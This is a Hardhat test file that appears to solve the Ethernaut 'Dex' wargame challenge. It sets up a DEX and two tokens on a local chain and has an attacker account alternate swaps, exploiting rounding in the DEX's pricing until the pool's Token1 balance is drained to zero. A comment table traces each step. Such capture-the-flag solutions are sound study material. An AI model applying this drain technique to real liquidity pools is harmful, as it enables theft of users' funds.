const { expect } = require("chai");
const hre = require("hardhat");
const { ethers, JsonRpcProvider } = require('ethers');

describe("Dex exploit", function () {
  it("Attacker shpould drain DEX Token1 balance to 0", async function () {
    const [owner, attacker] = await hre.ethers.getSigners();

    const Dex = await hre.ethers.getContractFactory("Dex");
    const SwappableToken = await hre.ethers.getContractFactory("SwappableToken");

    const dex = await Dex.deploy();
    const swappableToken1 = await SwappableToken.connect(owner).deploy(dex.address, "Token1", "TOK1", ethers.utils.parseEther("110"));
    const swappableToken2 = await SwappableToken.connect(owner).deploy(dex.address, "Token2", "TOK2", ethers.utils.parseEther("110"));
    await dex.deployed();
    await swappableToken1.deployed();
    await swappableToken2.deployed();

    // Setup Ethernaut initial state
    // You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
    await dex.connect(owner).setTokens(swappableToken1.address, swappableToken2.address);
    await swappableToken1.connect(owner)["approve(address,address,uint256)"](owner.address, dex.address, ethers.utils.parseEther("100"));
    await dex.connect(owner).addLiquidity(swappableToken1.address, ethers.utils.parseEther("100"));
    await swappableToken2.connect(owner)["approve(address,address,uint256)"](owner.address, dex.address, ethers.utils.parseEther("100"));
    await dex.connect(owner).addLiquidity(swappableToken2.address, ethers.utils.parseEther("100"));
    await swappableToken1.connect(owner).transfer(attacker.address, ethers.utils.parseEther("10"));
    await swappableToken2.connect(owner).transfer(attacker.address, ethers.utils.parseEther("10"));

    // approve dex for attacker
    await swappableToken1.connect(attacker)["approve(address,address,uint256)"](attacker.address, dex.address, ethers.utils.parseEther("500"));
    await swappableToken2.connect(attacker)["approve(address,address,uint256)"](attacker.address, dex.address, ethers.utils.parseEther("500"));

    // execute exploit
    // | DEX Token1   |      DEX Token2   | USER Token1   |      USER Token2   |
    // |--------------|:-------------:|-------------------:|------------------:|
    // | 100          |      100      |          10       |         10        |
    // | 110          |       90      |           0       |         20        |   
    // | 86           |      110      |          24       |         0         |  
    // | 110          |      80       |          0        |         30        |   
    // | 69           |      110      |          41       |         0         |  
    // | 110          |      45       |          0        |         65        |  
    // | 0            |      90       |          110      |         20        |

    // Each swap we swap all we have from token that we get in last swap, except in the las step, 
    // where we ned to calculate how mush we need to send of Token2 to drain all Token1 from DEX.
    // amount * 110 / 45 = 110 (Token1 dex balance)
    // amount = 45

    console.log("SWAP 1");
    await dex.connect(attacker).swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(attacker.address));
    console.log("SWAP 2");
    await dex.connect(attacker).swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(attacker.address));
    console.log("SWAP 3");
    await dex.connect(attacker).swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(attacker.address));
    console.log("SWAP 4");
    await dex.connect(attacker).swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(attacker.address));
    console.log("SWAP 5");
    await dex.connect(attacker).swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(attacker.address));

    // last swap
    const lastAmount = await swappableToken2.balanceOf(dex.address);
    await dex.connect(attacker).swap(swappableToken2.address, swappableToken1.address, lastAmount);

    // assert
    expect(await swappableToken1.balanceOf(dex.address)).to.equal(0);
  });
});